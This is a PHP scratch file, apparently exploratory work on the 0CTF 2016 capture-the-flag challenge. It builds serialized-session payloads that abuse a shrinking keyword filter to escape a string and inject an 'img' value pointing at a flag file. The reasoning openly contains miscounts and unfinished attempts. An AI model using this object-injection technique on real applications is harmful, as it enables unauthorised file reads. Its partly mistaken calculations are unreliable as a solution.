<?php
// The key insight from the 0CTF 2016 challenge:
// When the filter SHRINKS the string, the serialized length is LARGER than actual
// The parser reads past the intended boundary
// 
// The trick is to inject content that:
// 1. Gets "consumed" by the overflow
// 2. Results in a valid serialized structure

// Let me think about this from the perspective of what we want to achieve:
// We want the final parsed array to have img = "ZDBnM19mMWFnLnBocA=="
// 
// The original array: {user, function, img}
// We want to inject a new img that overwrites the original

// PHP arrays allow duplicate keys, and the LAST one wins!
// So if we inject: {user, function, img, img}
// The second img would overwrite the first!

// But the array count says 3, so we can't have 4 elements...
// 
// Wait, what if we use the escape to "replace" one of the elements?

// Let me try:
// user = 'flag' + injection
// injection = '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter:
// s:45:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// Parser reads 45 bytes from ""
// Reads: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// That's 66 chars, not 45!

// Hmm, I'm still making mistakes. Let me count more carefully.

// injection = '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// Let me count character by character:
// " = 1
// ; = 1
// s = 1
// : = 1
// 8 = 1
// : = 1
// " = 1
// f = 1
// u = 1
// n = 1
// c = 1
// t = 1
// i = 1
// o = 1
// n = 1
// " = 1
// ; = 1
// s = 1
// : = 1
// 1 = 1
// 0 = 1
// : = 1
// " = 1
// s = 1
// h = 1
// o = 1
// w = 1
// _ = 1
// i = 1
// m = 1
// a = 1
// g = 1
// e = 1
// " = 1
// ; = 1
// s = 1
// : = 1
// 3 = 1
// : = 1
// " = 1
// i = 1
// m = 1
// g = 1
// " = 1
// ; = 1
// s = 1
// : = 1
// 2 = 1
// 0 = 1
// : = 1
// " = 1
// Z = 1
// D = 1
// B = 1
// n = 1
// M = 1
// 1 = 1
// 9 = 1
// m = 1
// M = 1
// W = 1
// F = 1
// n = 1
// L = 1
// n = 1
// B = 1
// o = 1
// c = 1
// A = 1
// = = 1
// = = 1
// " = 1
// ; = 1
// } = 1
// Total: 66 chars

// So injection is 66 chars, and 'flag' is 4 chars
// user = 'flag' + injection = 70 chars
// 
// After filter: injection = 66 chars
// 
// Serialized: s:70:"flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:70:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// Parser reads 70 bytes from ""
// Content available: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// That's 66 chars
// Parser needs 4 more bytes, reads from next field

// The next field starts with: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Wait, that's not right. Let me trace through the full serialized string.

$_SESSION = [];
$_SESSION['user'] = 'flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

// Now let me trace through the parsing manually
// 
// Filtered: a:3:{s:4:"user";s:70:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Parser reads:
// a:3:{ - array with 3 elements
// s:4:"user" - key "user"
// s:70:" - value is string of length 70
//   Now it reads 70 bytes starting from position after the opening quote
//   The content at that position is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   First 70 bytes: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"fu
//   This becomes the value of 'user'
//   
//   Then parser continues from: nction";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   This is: nction";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   The parser expects a key (s:N:"..."), but sees "nction" which is invalid

// So the parsing fails because the overflow corrupts the next key

// Let me try a different approach:
// What if we use the escape to inject content that "completes" the array?

// The key insight: we need the overflow to read EXACTLY the remaining original structure
// and then the parser should see our injected closing brace

// Let me calculate:
// Remaining original structure after user value: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// Length: 73 chars

// Overflow needed: 73 chars
// Each 'flag' generates 4 chars of overflow
// 73 / 4 = 18.25, so we need 19 'flag's = 76 chars of overflow
// But that's 3 chars too many!

// What if we use 'php' (3 chars) instead?
// 73 / 3 = 24.33, so we need 25 'php's = 75 chars of overflow
// Still 2 chars too many!

// Let me try a combination:
// 18 'flag's (72 chars) + 1 extra char
// But we can't generate 1 char of overflow...

// Hmm, let me think about this differently.
// 
// What if we use the escape to inject content that includes the closing brace?
// 
// user = 'flag' * 18 + '";}'
// 
// 'flag' * 18 = 72 chars
// '";}' = 3 chars
// Total: 75 chars
// 
// After filter: '";}' = 3 chars
// 
// Serialized: s:75:"flagflag...flag";}"
// After filter: s:75:"";}"
// Parser reads 75 bytes from ""
// Content available: ";}" + remaining structure (73 chars)
// Total: 76 chars
// 
// First 75 bytes: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// This becomes the value of 'user'
// 
// Then parser continues from: "}
// This is: "}
// The parser expects a key, but sees "}
// This might close the array!

// Let me test this

$_SESSION = [];
$_SESSION['user'] = str_repeat('flag', 18) . '";}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "=== Test with 18 flags ===\n";
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);

// Hmm, let me trace through this more carefully
// 
// Serialized: a:3:{s:4:"user";s:75:"flagflag...flag";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// After filter: a:3:{s:4:"user";s:75:"";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Parser reads:
// a:3:{ - array with 3 elements
// s:4:"user" - key "user"
// s:75:" - value is string of length 75
//   Content: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   First 75 bytes: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   This is exactly 75 chars!
//   
//   Wait, let me count: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   " = 1, ; = 1, } = 1, " = 1, ; = 1, s = 1, : = 1, 8 = 1, : = 1, " = 1, ...
//   Actually, the content after s:75:" is: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   That's: ";}" (3 chars) + remaining structure (73 chars) = 76 chars
//   
//   First 75 bytes: ";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw=="; (missing the last })
//   
//   Then parser continues from: }
//   This is just }
//   The parser expects a key, but sees }
//   This closes the array!

// But wait, the array count is 3, and we only have 1 element (user)!
// Let me check if PHP allows this...

